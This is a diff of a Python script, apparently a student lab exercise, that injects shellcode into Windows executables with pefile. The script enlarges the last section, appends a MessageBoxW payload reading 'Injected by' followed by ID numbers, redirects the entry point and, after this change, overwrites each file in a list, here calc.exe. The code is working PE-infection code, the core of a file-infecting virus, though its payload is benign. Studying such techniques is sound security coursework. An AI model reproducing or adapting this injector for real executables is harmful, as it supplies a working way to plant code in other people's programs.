@@ -5,7 +5,7 @@ import shutil
 import struct
 
 
-def get_message_box_w():
+def get_message_box_w(pe):
     # Get the MessageBoxW
     address_of_message_box_w = None
     for entry in pe.DIRECTORY_ENTRY_IMPORT:
@@ -18,7 +18,7 @@ def get_message_box_w():
     if not address_of_message_box_w:
         print("[-] PE file not imported MessageBoxW")
         return False
-    
+
     print("Address of MessageBoxW: ", hex(address_of_message_box_w))
     return address_of_message_box_w
 
@@ -39,7 +39,7 @@ def align(value, alignment):
 # Create payload
 
 
-def create_shell_code(virtual_address_of_caption, virtual_address_of_text, address_of_message_box_w):
+def create_shell_code(virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w):
     shell_code = b'\x33\xC0'
     shell_code += b'\x40'
     shell_code += b'\x0F\xA2'
@@ -60,39 +60,40 @@ def create_shell_code(virtual_address_of_caption, virtual_address_of_text, addre
     shell_code += b'\x49\x00\x6e\x00\x66\x00\x6f\x00'
     shell_code += b'\x00' * 24
     shell_code += b'\x49\x00\x6E\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x65\x00\x64\x00\x20\x00\x62\x00\x79\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x33\x00\x39\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x30\x00\x34\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x31\x00\x37'
-    
+
     return shell_code
 
 
 def add_more_space(path):
     # Get original_size and add more space to file pe
-    print("[*] STEP 1 - Resize the Executable")
+    print("[*] Resize the Executable")
 
     original_size = os.path.getsize(path)
-    print("\t[+] Original Size = %d" % original_size)
+    print("\t[+] Original Size = ", hex(original_size))
     fd = open(path, 'a+b')
     map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
     map.resize(original_size + 0x1000)
     map.close()
     fd.close()
 
-    print("\t[+] New Size = %d bytes\n" % os.path.getsize(path))
+    print("\t[+] New Size = :", hex(os.path.getsize(path)))
     return original_size
 
 
-try:
+def injected_shell_code(input, output):
     # Path to pe file
-    path = 'C:\\Users\\ADmin\\Desktop\\TestPlace\\NOTEPAD.EXE'
+    path = input
     pe = pefile.PE(path)
     
-    # Add more space and get the original size
     original_size = add_more_space(path)
+    raw_address_of_shell_code = original_size 
+    print("raw address shellcode: ", hex(raw_address_of_shell_code))
     number_of_sections = get_info_section(pe)
-    
+
     # Get the last section
     last_section = pe.sections[-1]
     print("Last section info: ", last_section)
-    
+
     # Get the image base and old entry points
     image_base = pe.OPTIONAL_HEADER.ImageBase
     entry_point_old = pe.OPTIONAL_HEADER.AddressOfEntryPoint
@@ -103,7 +104,7 @@ try:
     last_section_raw_offset = last_section.PointerToRawData + last_section.SizeOfRawData
 
     # Locate where to inject shell_code
-    raw_address_of_shell_code = original_size
+    # raw_address_of_shell_code = original_size
     raw_address_of_caption = raw_address_of_shell_code + 0x50
     raw_address_of_text = raw_address_of_shell_code + 0x70
 
@@ -121,13 +122,15 @@ try:
                     new_entry_point - 45) & 0xffffffff
 
     # Get the address of message box w
-    address_of_message_box_w = get_message_box_w()
+    address_of_message_box_w = get_message_box_w(pe)
 
     shell_code = create_shell_code(
-        virtual_address_of_caption, virtual_address_of_text, address_of_message_box_w)
-    
+        virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w)
+
+    # Inject shell code
     print("\nShell-code : ")
     print(shell_code)
+    print("Inject at : ", hex(raw_address_of_shell_code))
     pe.set_bytes_at_offset(raw_address_of_shell_code, shell_code)
 
     # Resize VirtualSize and RawData
@@ -136,8 +139,13 @@ try:
     last_section.SizeOfRawData += 0x1000
     pe.OPTIONAL_HEADER.SizeOfImage += 0x1000
 
-    pe.write("C:\\Users\\ADmin\\Desktop\\TestPlace\\Injected.exe")
+    pe.write(path)
     print("Inject Successfully!!")
 
-finally:
-    print("\nDone")
+file = [
+    'Test/calc.exe'
+]
+
+for input_file in file :
+    output_file = input_file.replace('.exe', '-injected.exe')
+    injected_shell_code(input_file, output_file)
